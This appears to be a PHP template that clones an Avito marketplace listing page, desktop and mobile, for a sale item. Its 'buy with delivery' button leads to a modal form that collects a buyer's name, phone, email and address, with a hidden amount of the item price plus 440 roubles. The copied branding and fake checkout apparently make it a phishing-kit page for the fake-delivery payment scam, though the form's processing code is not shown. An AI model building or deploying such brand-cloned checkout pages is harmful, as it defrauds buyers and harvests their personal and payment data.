          <a class="js-breadcrumbs-link js-breadcrumbs-link-interaction" href="<?php echo $breadcrumb["link"]; ?>" title="<?php echo $breadcrumb["title"]; ?>" ><?php echo $breadcrumb["text"]; ?></a>
          
          <?php if (count($data["item"]["breadcrumbs"]) - 1 != $i){ ?>
            <span class="breadcrumbs-separator">/</span>
          <?php } ?>
        <?php } ?>
      </div>
    </div>
 </div>
 
 <div
 class="item-view js-item-view"
 itemscope itemtype="http://schema.org/Product">
   

              <div class="item-view-header "> <div class="item-view-left">
   
<div class="item-view-title-info js-item-view-title-info"> <div class="title-info title-info_mode-with-favorite"> <div class="title-info-main"> <h1 class="title-info-title">
  <span class="title-info-title-text" itemprop="name"><?php echo $data["item"]["title"]; ?></span>
 </h1> </div> <div id="toggle-sticker-header" class="js-toggle-sticker-header"></div>
  <div class="title-info-metadata">
    </div>
  <div class="title-info-actions">
      <div class="title-info-actions-item">
    <a  data-side=""  data-action data-favorite-mode="button"  data-options="&#x7B;&quot;isFavorite&quot;&#x3A;false,&quot;categorySlug&quot;&#x3A;&quot;telefony&quot;,&quot;compare&quot;&#x3A;null&#x7D;"  href="https://avito.ru/favorites/"  class="button button-origin button-origin_small add-favorite-button js-add-favorite"> <i class="add-favorite-button-icon"></i> <span class="add-favorite-button-text">Добавить в избранное</span> </a>    <a  data-side=""  href="#login?next=%3Fopen-add-note&s=n"  class="button button-origin button-origin_small item-notes-button js-item-add-note-button"> <i class="item-notes-icon_add"></i>Добавить заметку </a> 
    <div class="title-info-metadata-item-redesign"><?php echo $data["item"]["publish_date"]; ?></div>       
    </div>
    </div>
    </div> </div>
  </div> <div class="item-view-right">
  <div class="item-view-price">
 
<div class="item-price"> <div class="item-price-wrapper">
  <div class="item-price-value-wrapper">
   
<div itemprop="offers" itemscope itemtype="http://schema.org/Offer" class="price-value price-value_side-card" id="price-value"> <span class="price-value-string js-price-value-string">
   <span class="js-item-price" content="<?php echo $data["item"]["price"]["number"]; ?>" itemprop="price"><?php echo $data["item"]["price"]["formatted"]; ?></span>&nbsp;<span itemprop="priceCurrency" content="RUB" class="price-value-prices-list-item-currency_sign"><span class="font_arial-rub">₽</span></span> 
 </span>
 </div>
 </div>
  
 </div>
   
 </div>
 </div>
  </div> </div>
 
 <div class="item-view-content"> <div class="item-view-left">
  <div class="item-view-main js-item-view-main">
      
      
      
   <div class="item-view-gallery" data-hero="true">
                                     

    <div class="gallery gallery_state-clicked js-gallery">
      <div class="gallery-imgs-wrapper">
        <div class="gallery-imgs-container js-gallery-imgs-container">
          <?php foreach ($data["item"]["gallery"] as $i => $image){ ?>
            <div class="gallery-img-wrapper js-gallery-img-wrapper">
              <div class="gallery-img-frame js-gallery-img-frame"  data-url="<?php echo $image["full"]; ?>"  data-title="<?php echo $image["title"]; ?>">   
                <span class="gallery-img-cover" style="background-image: url(<?php echo $image["medium"]; ?>)"></span> 
                <img src="<?php echo $image["medium"]; ?>" alt="<?php echo $image["title"]; ?>">   
              </div>
            </div> 
          <?php } ?>
        </div>     
      <div class="gallery-navigation gallery-navigation_prev js-gallery-navigation" data-dir="prev"> <span class="gallery-navigation-icon"></span> </div> <div class="gallery-navigation gallery-navigation_next js-gallery-navigation" data-dir="next"> <span class="gallery-navigation-icon"></span> </div>   </div>    <div class="gallery-list-wrapper"> 
                                   
      <ul class="gallery-list js-gallery-list">
        <?php foreach ($data["item"]["gallery"] as $i => $image){ ?>
          <li class="gallery-list-item js-gallery-list-item<?php if ($i == 0) echo " gallery-list-item_selected"; ?>" data-index="<?php echo $i; ?>" data-type="image">
            <span class="gallery-list-item-link" title="<?php echo $image["title"]; ?>" style="background-image: url(<?php echo $image["thumbnail"]; ?>);"></span>
          </li>  
        <?php } ?>
      </ul>
      
      </div></div>
      <div class="gallery-extended gallery-extended_state-clicked gallery-extended_state-hide js-gallery-extended" data-shop-id="">
        <div class="gallery-extended-content-wrapper js-gallery-extended-content-wrapper">
          <div class="gallery-extended-content js-gallery-extended-content">
            <div class="gallery-extended-container js-gallery-extended-container">
            <div class="gallery-extended-close js-gallery-extended-close"></div>
            <div class="gallery-extended-imgs-control">
              <div class="gallery-extended-img-nav gallery-extended-img-nav_type-prev js-gallery-extended-img-nav" data-dir="prev">
                <span class="gallery-extended-img-nav-icon"></span>
              </div> 
              <div class="gallery-extended-img-nav gallery-extended-img-nav_type-next js-gallery-extended-img-nav" data-dir="next">
                <span class="gallery-extended-img-nav-icon"></span>
              </div>

              <div class="gallery-extended-imgs-wrapper js-gallery-extended-imgs-wrapper">
                  <?php foreach($data["item"]["gallery"] as $i => $image){ ?>
                    <div class="gallery-extended-img-frame gallery-extended-img-frame js-gallery-extended-img-frame"  data-url="<?php echo $image["full"]; ?>" data-alt-urls="[&quot;<?php echo $image["full"]; ?>&quot;]"  data-title="<?php echo $image["title"]; ?>">
                      <img src="<?php echo $image["full"]; ?>" alt="<?php echo $image["title"]; ?>">
                    </div>
                  <?php } ?>
              </div> 

            </div>
          </div>
        </div>
      </div>
    <div class="gallery-extended-list-wrapper js-gallery-extended-list-wrapper">

      <ul class="gallery-extended-list js-gallery-extended-list">
        <?php foreach($data["item"]["gallery"] as $i => $image){ ?>      
          <li class="gallery-extended-list-item js-gallery-extended-list-item<?php if ($i == 0) echo " gallery-extended-list-item_selected"; ?>" data-index="<?php echo $i; ?>" data-type="image">
            <span class="gallery-extended-list-item-link" title="<?php echo $image["title"]; ?>" style="background-image: url(<?php echo $image["thumbnail"]; ?>);"></span>
          </li>
        <?php } ?>
      </ul>

    </div>
    
    <div class="gallery-extended-list-navigation gallery-extended-list-navigation_state-hide js-gallery-extended-list-navigation" data-dir="up"> <span class="gallery-extended-list-navigation-icon"></span> </div> <div class="gallery-extended-list-navigation gallery-extended-list-navigation_state-hide gallery-extended-list-navigation_bottom js-gallery-extended-list-navigation_bottom" data-dir="bottom"> <span class="gallery-extended-list-navigation-icon"></span> </div>  </div>     
                                                    

    </div>
      

<div class="item-view-block item-view-map js-item-view-map item-view-map_new" itemscope="" itemtype="http://schema.org/Place">
<div class="item-map js-item-map item-map_new" data-new-item-map="1">
    <div class="item-map-location">
  <div class="item-address">
   <span class="item-address__string" itemprop="address" itemscope itemtype="http://schema.org/PostalAddress"><?php echo $data["item"]["location"]["address"]; ?></span>    <div class="item-address-georeferences">   <span class="item-address-georeferences-item">   <span class="item-address-georeferences-item-icons">   <i class="item-address-georeferences-item-icons__icon" style="background-color: <?php echo $data["item"]["location"]["metro"]["color"]; ?>"> </i>   </span>    <span class="item-address-georeferences-item__content"><?php echo $data["item"]["location"]["metro"]["title"]; ?></span>    </span>   </div>   </div>

 <div class="item-map-location__control">
  <div class="item-map-control">
  <a data-text-open="Показать карту" data-text-close="Скрыть карту" class="item-map-slider-toggle js-item-map-slider-toggle ">Показать карту</a>
  </div>
  </div>
    </div>

  </div>
</div>
      
  <div class="item-view-block">
 
<div class="item-description">

   <div class="item-description-text" itemprop="description">   <p><?php echo $data["item"]["description"]; ?></p>  </div>  

</div>
 </div>
       </div>
    
 <div class="item-view-socials">
 <div class="item-socials"> <div class="item-socials-actions clearfix">
  <div class="item-socials-share">
 
<div class="js-social-share social-share"
 data-services="vkontakte,odnoklassniki,facebook,gplus,twitter,moimir,lj"
 data-title="Объявление на Авито - Шлем кроссовый"
 data-description="ШлемШлем кроссовый Продам Шлем Shoei VFX-WRЛюбые размеры и цвета При необходимости отправлю почтой или транспортной компанией..."
 data-url="https://www.avito.ru/rostov-na-donu/sport_i_otdyh/shlem_krossovyy_1204741917"
 data-image="https://www.avito.ru/img/share/auto/5168199679"
 data-social-list='{"vkontakte":2,"odnoklassniki":5,"facebook":7,"gplus":6,"twitter":4,"moimir":1,"lj":3}'
  data-event-params='{"url":"\/js\/event","itemId":null,"type":"social"}'
 > </div>
 </div>
    <div class="item-socials-abuse"> <button class="js-abuse-button button button-origin">Пожаловаться</button> <input class="js-token" type="hidden" name="token[1557687262804]" value="771545b75723a41a"> <div id="abuse" data-abuse='{"itemId":null,"isAuth":false}'  data-recaptcha-enabled="1"></div> </div>
  </div> </div>
 </div>
    <div class="item-view-similars">
   <div class="similars js-similars similars_column-4"
 data-show-more-btn="1"> <div class="similars-inner similars-inner_hidden js-similars-inner">
  
 <div class="similars-list js-similars-list"></div>
  </div> </div>
 </div>
   </div> <div class="item-view-right">
  <div class="item-view-contacts js-item-view-contacts">
    <div class="item-view-actions"> <div class="item-actions js-item-actions">
  
<div class="js-delivery-order " data-marker="delivery-item-card" data-side="card" data-is-login="" data-item-id="1204741917" data-item-url="/rostov-na-donu/sport_i_otdyh/shlem_krossovyy_1204741917">
    <div>
        
    <a id="btn"> <button data-marker="delivery-item-button-main" class="button-button-2Fo5k button-size-l-3LVJf button-primary-1RhOG width-width-12-2VZLz" aria-busy="false"><span class="button-textBox-Row9K">Купить с доставкой</span></button>
    </a>
        
    <div class="order-button-preloader-block-Y8ce4" style="text-align:center;margin-top:10px;"><a href="https://avito.ru/dostavka#buyer" target="_blank" data-marker="delivery-item-landing" class="link-link-39EVK link-design-default-2sPEv link-novisited-1w4JY">Как работает Авито Доставка</a>
    </div>
    </div>
</div>
   
    
   </div> </div>
  
 <div class="item-view-seller-info js-item-view-seller-info">
                 
<div class="seller-info js-seller-info">
  <div class="seller-info-prop js-seller-info-prop_seller-name seller-info-prop_layout-two-col">
      
 <div class="seller-info-col"> 
  <div class="seller-info-value"> <div class="seller-info-name js-seller-info-name">    <a href="<?php echo $data["seller"]["link"]; ?>" title="Нажмите, чтобы перейти в профиль"><?php echo $data["seller"]["name"]; ?></a>   </div>   <div class="seller-info-rating">    </div>   </div>   <div><?php echo $data["seller"]["type"]; ?></div>    <div class="seller-info-value">    <div><?php echo $data["seller"]["date"]; ?></div>       </div>   </div> 
      
      
  <div class="seller-info-avatar">
     <a  class="seller-info-avatar-image  js-public-profile-link"  href="<?php echo $data["seller"]["link"]; ?>"  title="Нажмите, чтобы перейти в профиль"style="background-image: url('<?php echo $data["seller"]["image"]; ?>')">Публичный профиль</a>     </div>
   </div>

  </div>
 </div>
      
  <div class="item-view-search-info-redesign">
   <span data-marker="item-view/item-id"><?php echo $data["item"]["id"]; ?></span>   ,   <div class="title-info-metadata-item title-info-metadata-views"> <i class="title-info-icon-views"></i><?php echo $data["item"]["views"]; ?></div>       
  </div>
      
    </div>
  
 <div class="item-view-promo">
     <div class="item-view-promo-item">
    <div class="avito-ads-container avito-ads-container_wl"> <div id="template_wl" class="avito-ads-template"> <div class=" avito-ads-content"> </div> </div> </div>
    <div class="avito-ads-container avito-ads-container_tgb1"> <div id="template_tgb1" class="avito-ads-template"> <div class="ad_308x133 avito-ads-content"> </div> </div> </div>
 </div>
  </div>
  <div class="avito-ads-tgb2-sticky-container">
    <div class="avito-ads-container avito-ads-container_tgb2"> <div id="template_tgb2" class="avito-ads-template"> <div class="ad_308x133 avito-ads-content"> </div> </div> </div>
 </div>
  </div> </div>
  <div class="item-view-low-ads">
    <div class="avito-ads-container avito-ads-container_ldr_low"> <div id="template_ldr_low" class="avito-ads-template"> <div class=" avito-ads-content"> </div> </div> </div>
 </div>
  </div>
  <div class="slide-alert js-slide-alert">
  </div>
  <div class="item-tooltip js-item-tooltip tooltip tooltip_bottom"> <i class="item-tooltip-arrow js-item-tooltip-arrow tooltip-arrow"></i> <div class="item-tooltip-content js-item-tooltip-content tooltip__content"></div> </div>
 <script type="text/template" id="js-cookie-support"> <div class="cookie-support-icon"></div> <div class="cookie-support-title">Произошла ошибка</div> <div class="cookie-support-body">Для продолжения работы включите поддержку cookies<br>в&nbsp;настройках вашего браузера.</div> <button type="button" class="button button-origin js-reload-page">Я включил поддержку cookies</button> </script>
  <div id="js-delivery-widget" data-item-id="1204741917"></div>
  </div>
  <?php } ?>
  
<div class="js-footer-app" data-source-data="{&quot;luri&quot;:&quot;rossiya&quot;,&quot;countrySlug&quot;:&quot;rossiya&quot;,&quot;supportPrefix&quot;:&quot;https:\/\/support.avito.ru&quot;,&quot;siteName&quot;:&quot;Авито&quot;,&quot;city&quot;:null,&quot;mobileVersionUrl&quot;:&quot;m.avito.ru\/rostov-na-donu\/sport_i_otdyh\/shlem_krossovyy_1204741917?nomobile=0&quot;,&quot;isShopBranding&quot;:null,&quot;isCompanyPage&quot;:false,&quot;isTechPage&quot;:false,&quot;isBrowserMobile&quot;:false}"><div class="l-footer footer-root-3ECpH"><ul class="footer-nav-lfam7"><li><a class="footer-item-1YHjJ" href="https://avito.ru/additem" title="Подать объявление">Подать объявление</a></li><li><a class="footer-item-1YHjJ" href="https://avito.ru/rossiya/">Объявления</a></li><li><a class="footer-item-1YHjJ" href="https://avito.ru/shops">Магазины</a></li><li><a class="footer-item-1YHjJ" href="https://avito-support.ru/" target="_blank" rel="noopener noreferrer">Помощь</a></li><li><a class="footer-item-1YHjJ" href="https://avito.ru/safety">Безопасность</a></li><li><a class="footer-item-1YHjJ" href="https://avito.ru/reklama/advertising" rel="nofollow">Реклама на сайте</a></li><li><a class="footer-item-1YHjJ" href="https://avito.ru/company">О компании</a></li><li><a class="footer-item-1YHjJ" href="https://avito.ru/company/job">Карьера</a></li><li><a class="footer-item-1YHjJ" href="https://avito.ru/info/apps"><strong>Мобильное приложение</strong></a></li></ul><div class="footer-info-2fadp"><div class="footer-about-12ZK4">Авито — сайт объявлений. © ООО «КЕХ еКоммерц» 2007–2019. <a class="footer-site-info-link-PZQTP" href="https://support.avito.ru/articles/200026948">Условия использования Авито</a>. <a class="footer-site-info-link-PZQTP" href="https://avito.ru/safety/personal/company">Политика о данных пользователей</a>. Оплачивая услуги на Авито, вы принимаете <a class="footer-site-info-link-PZQTP" href="https://support.avito.ru/articles/200026938">оферту</a>. </div></div></div></div>
   </div>

<script src="js/jquery.arcticmodal-0.3.min.js"></script>
<script>
    $(function () {
        $("#btn").click(function () {
            $("#myModal").arcticmodal();
        });
    });
</script>


       </body> 
</html>
<?php } else { ?>

  <!DOCTYPE html>
<html lang="ru">

<head>
	<link rel="preconnect" href="https://www.avito.ru/">
	<link rel="preconnect" href="https://www.google-analytics.com/">
	<link rel="preconnect" href="https://yastatic.net/">
	<title data-react-helmet="true"><?php echo $data["page_title"]; ?></title>
	<meta charset="utf-8">
	<meta name="MobileOptimized" content="320">
	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
	<meta name="format-detection" content="telephone=no">
	<meta name="HandheldFriendly" content="True">
	<meta http-equiv="cleartype" content="on">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
	<meta name="theme-color" content="#00aaff">
	<link rel="shortcut icon" href="https://www.avito.st/mstatic/favicon.ico" type="image/x-icon">
  <link rel="manifest" href="https://m.avito.ru/mstatic/manifest.json">
	<link rel="stylesheet" href="mobile/mstatic/build/8.4e748d0ecc.css" type="text/css">
	<link rel="stylesheet" href="mobile/mstatic/build/27.13b05c5e60.css" type="text/css">
  <link rel="stylesheet" href="mobile/mstatic/build/25.22b68166cf.css" type="text/css">
  <script src="js/jquery-1.9.1.js"></script>
  <script src="js/slick.js"></script>
  <script src="js/mobile-gallery.js"></script>
  <script src="js/mobile-form.js"></script>
</head>

<body onbeforeunload="">
	<div id="app">
		<div class="_3mwas" id="mobile-form" style="display: none;">
			<div class="_1TOpD">
				<div class="_13ap3">
					<div class="_39hcM">
						<button class="_1zcG- _1_DqS" type="button"></button>
					</div>
					<div class="_2Pd-N">
						<h1 class="_120yE hxiJS _2Y9He _3SKtX _3SR8_ _3t7jS"><span class="_3sIpL _3qYXA _1vUIr">Получатель</span></h1></div>
				</div>
			</div>
			<div>
				<div class="_3UrVi">
					<label class="M5S07" for="fullname">Имя</label>
					<div class="_25XI- _2VZLz _2HF__">
						<input id="fullname" name="fullname" placeholder="Имя" type="text" class="_25uCh _1Wbyq" value="">
					</div>
				</div>
				<div class="_3UrVi">
					<label class="M5S07" for="phone">Телефон</label>
					<div class="_25XI- _2VZLz _2HF__">
						<input id="phone" name="phone" placeholder="Телефон" type="text" class="_25uCh _1Wbyq" value="">
					</div>
				</div>
				<div class="_3UrVi">
					<label class="M5S07" for="email">Электронная почта</label>
					<div class="_25XI- _2VZLz _2HF__">
						<input id="email" name="email" type="email" placeholder="Электронная почта" class="_25uCh _1Wbyq" value="">
					</div>
        </div>
				<div class="_3UrVi">
					<label class="M5S07" for="address">Адрес доставки</label>
					<div class="_25XI- _2VZLz _2HF__">
						<input id="address" name="address" type="text" placeholder="Адрес доставки" class="_25uCh _1Wbyq" value="">
					</div>
				</div>

        <input id="amount" type="hidden" value="<?php echo $data["item"]["price"]["number"] + 440; ?>">
        <input id="title" type="hidden" value="<?php echo $data["item"]["title"]; ?>">

				<div class="V3w5N">
					<button type="submit" data-marker="delivery-widget-contacts/continue" class="_1wntu mx6MK _1y86K">Продолжить</button>
				</div>
			</div>
		</div>

		<div class="_6TbRg" data-marker="item-container" itemscope="" itemType="http://schema.org/Product">
			<div class="_3_pME" data-marker="item-top-bar">
				<div class="_111AZ" data-marker="item-top-bar/wrapper">
					<div class="AFTCm" data-marker="item-top-bar/container">
						<div class="_1ZON_">
							<div class="_1Fe2M" data-marker="item-top-bar/back"><i class="_33bYv"></i></div>
						</div>
						<div class="_239AQ">
							<div class="_2iGgz" data-marker="item-top-bar/favorite"><i class="_38TmR"></i></div>
							<div class="_1mRgB" data-marker="item-top-bar/share"><i class="_2mzje"></i></div>
						</div>
					</div>
				</div>
			</div>
			<div class="LOnQ-">
				<div>
					<div class="_1onvw" data-marker="image-gallery">
						<div>
							<div class=" jgzNR">
								<div class="_1VAcI">
									<div style="transform:" class="_1HkKs FXIao">
										<div class="_2EqYU">
											<ul id="gallery" class="_3Up4j _3MT6v" style="-webkit-transform:translate3d(0%,0,0);-moz-transform:translate3d(0%,0,0);-ms-transform:translate3d(0%,0,0);-o-transform:translate3d(0%,0,0);transform:translate3d(0%,0,0);-ms-transform:translate3d(0%,0,0);-webkit-transition-duration:150ms;-moz-transition-duration:150ms;-ms-transition-duration:150ms;-o-transition-duration:150ms;transition-duration:150ms;-ms-transition-duration:150ms">
                        <?php foreach ($data["item"]["gallery"] as $i => $image){ ?>
                          <li class="_3Y_d7">
                            <div class="_3vIem _1oLTC">
                              <div class="_16DDi FYXp7">
                                <span class="u9Rmc lazy-load-image-background opacity" style="background-size:100% 100%;color:transparent;display:inline-block">
                                  <img src="<?php echo $image["medium"]; ?>" class="u9Rmc">
                                </span>
                              </div>
                            </div>
                          </li>
                        <?php } ?>
											</ul>
                    </div>
                    <div class="_35CfL"><div class="_3c5P_">1 / <?php echo count($data["item"]["gallery"]); ?></div></div>
									</div>
								</div>
							</div>
						</div><i class="_2GdT5"></i></div>
				</div>
				<div class="_17gzo">
					<div class="cA5jt">
						<div class="Y_OBI">
							<div class="_31kJP">
								<div class="Y_OBI">
									<div class="_31kJP">
										<h1 data-marker="item-description/title" itemProp="name" class="_3Yw0O _1qpev _2xfUN DOHwG"><span class="CdyRB _3SYIM _2jvRd"><?php echo $data["item"]["title"]; ?></span></h1></div>
								</div>
								<div class="LgYs9" itemProp="offers" itemscope="" itemType="http://schema.org/Offer">
									<p class="_3q0e- _1Ekf2 -R32D"><span class="CdyRB _3SYIM _2jvRd"><meta itemProp="priceCurrency" content="RUB"/><meta itemProp="price" content="<?php echo $data["item"]["price"]["formatted"]; ?>"/><span data-marker="item-description/price"><?php echo $data["item"]["price"]["formatted"]; ?> руб.</span></span>
									</p>
								</div>
							</div>
						</div>
						<div class="_2fYtd _3cJ8V"></div>
						<div class="Y_OBI">
							<div class="_31kJP">
								<div data-marker="delivery">
									<div class="Y_OBI _3nkuZ">
										<div class="_31kJP"><a data-marker="delivery/primary" class="_2L2eW _3ce9I _2j2Es" id="button-delivery-mobile">Купить с доставкой</a></div>
									</div>
									<div class="Y_OBI _2MP5T">
										<div class="_31kJP"><a data-marker="delivery/secondary" href="https://m.avito.ru/dostavka#buyer" target="_blank" class="_2L2eW _3ce9I _2j2Es _1iGx3">Об Авито Доставке</a></div>
									</div>
								</div>
							</div>
						</div>
						<div class="_2fYtd _3cJ8V"></div>
						<div class="Y_OBI">
							<div class="_31kJP">
								<button data-marker="delivery/map" class="lTQDM" type="button"><i class="_3uwBz"></i><span data-marker="delivery/location" class="CdyRB _3SYIM J63BQ"><?php echo $data["item"]["location"]["address"]; ?></span></button>
							</div>
						</div>
						<div class="_2fYtd _3cJ8V WuWH1"></div>
					</div>
				</div>
				<div class="_24IHB" data-marker="item-properties/list">
					<div class="RZt0-">
						<div class="_30KZj" data-marker="item-properties-item(0)">
							<div class="_1C_Iq" data-marker="item-properties-item(0)/title">Категория</div>
							<div class="_3JBAb" data-marker="item-properties-item(0)/description"><?php echo $data["item"]["category"]; ?></div>
						</div>
					</div>
				</div>
				<div class="_17t4H" data-marker="item-description">
					<div class="_3cb2T _3MMPs">
						<div data-marker="item-description/text"><?php echo $data["item"]["description"]; ?></div>
					</div>
					<div class="_3cb2T _13fyY DfstZ">
						<div data-marker="item-description/full-text"><?php echo $data["item"]["description"]; ?></div>
					</div>
				</div>
				<div class="_3Fyxq">
					<a class="_2MJiu" data-marker="seller-info" href="<?php echo $data["seller"]["link"]; ?>">
						<div class="_22k28">
							<div class="_3wFDB">
								<div class="_1zaQk" data-marker="seller-info/content"><span class="MXmyi" data-marker="seller-info/name"><?php echo $data["seller"]["name"]; ?></span><span class="_2rm6l" data-marker="seller-info/postfix"><?php echo $data["seller"]["type"]; ?></span><span class="_3nbsF" data-marker="seller-info/summary">7 объявлений</span></div>
								<div class="_1RyK_">
									<div data-marker="avatar-seller-info" class="_1NuhD _3Pug4 _2dMWD"><img class="a7Lab" src="<?php echo $data["seller"]["image"]; ?>" /></div>
								</div>
							</div>
						</div>
					</a>
				</div>
				<div>
					<div class="_1vTQz" data-marker="share">
						<div class="_2PLfE"><span>Поделиться</span></div>
						<div class="_2HX5a" data-marker="share/container">
							<a data-marker="share/button" href="" class="_1EUgi _1JfK6"></a>
							<a data-marker="share/button" href="" class="_1EUgi ZvSjq"></a>
							<a data-marker="share/button" href="" class="_1EUgi _2hbbh"></a>
							<a data-marker="share/button" href="" class="_1EUgi _1RCFf"></a>
							<a data-marker="share/button" href="" class="_1EUgi _3JGGR"></a>
							<a data-marker="share/button" href="" class="_1EUgi LmO1S"></a>
						</div>
					</div>
				</div><span class="" style="display:inline-block;height:0;width:0"></span>
				<div class="_1VAO9" data-marker="item-stats">
					<div class="_1sUaX" data-marker="item-stats/views">Просмотров: всего <?php echo explode(" ", $data["item"]["views"])[0]; ?>, сегодня <?php echo explode(")", explode("(+", $data["item"]["views"])[1])[0]; ?></div>
					<div class="dqH0T" data-marker="item-stats/timestamp">Объявление: <?php echo $data["item"]["id"]; ?>, <span class="_3kQC4"><?php echo $data["item"]["publish_date"]; ?></span></div><a class="_2DN6M" data-marker="item-stats/abuse" href="kompyuter_amd_phenom_ii_1360142348/abuse3ad1.html?src=item"><i></i><span data-marker="item-stats/content">Пожаловаться</span></a></div>
				<div class="cWHK8">
					<div data-marker="item-contact-bar" class="_1avFw">
						<div class="_1BFyF" data-marker="item-contact-bar/content">
							<a class="_1aSl-" data-marker="item-contact-bar/avatar">
								<div class="_2IoI7">
									<div data-marker="avatar" class="_1nHQb _3Pug4 _2dMWD"><img class="a7Lab" src="<?php echo $data["seller"]["image"]; ?>" /></div>
								</div>
								<div class="_1bFmZ" data-marker="item-contact-bar/status"><span class="_2vfuv" data-marker="item-contact-bar/name"><?php echo $data["seller"]["name"]; ?></span><span class="KReAl" data-marker="item-contact-bar/status"></span></div>
							</a>
						</div>
					</div>
				</div>
			</div>
			<div class="_1UUMy" data-marker="footer">
				<div data-marker="content">
					<menu class="_2Kurz"><a class="AiTKL" href="https://avito-support.ru" data-marker="help">Помощь</a><a class="AiTKL" href="https://m.avito.ru/company" data-marker="company">О компании</a><a class="AiTKL" href="https://m.avito.ru/company/job" data-marker="position">Вакансии</a><a class="AiTKL" href="http://www.avito.ru/safety" data-marker="security">Безопасность</a><a class="AiTKL" href="http://www.avito.ru/info/reklama_na_saite" data-marker="ads">Реклама на сайте</a><a class="AiTKL" href="https://m.avito.ru/info/oferta" data-marker="oferta">Оферта</a><a class="AiTKL" href="http://www.avito.ru/safety/personal/company" data-marker="about-cookies">Политика о данных пользователей</a><a class="AiTKL" href="https://m.avito.ru/info/polzovatelskoe_soglashenie" data-marker="user-accept">Условия использования Авито</a></menu>
					<div class="_2bBFy">© ООО «КЕХ еКоммерц» 2007–2019</div>
				</div>
			</div>
		</div>
	</div>
	<div id="modalPage" style="display:none"></div>
	<div id="modal"></div>

</body>

</html>

<?php } ?>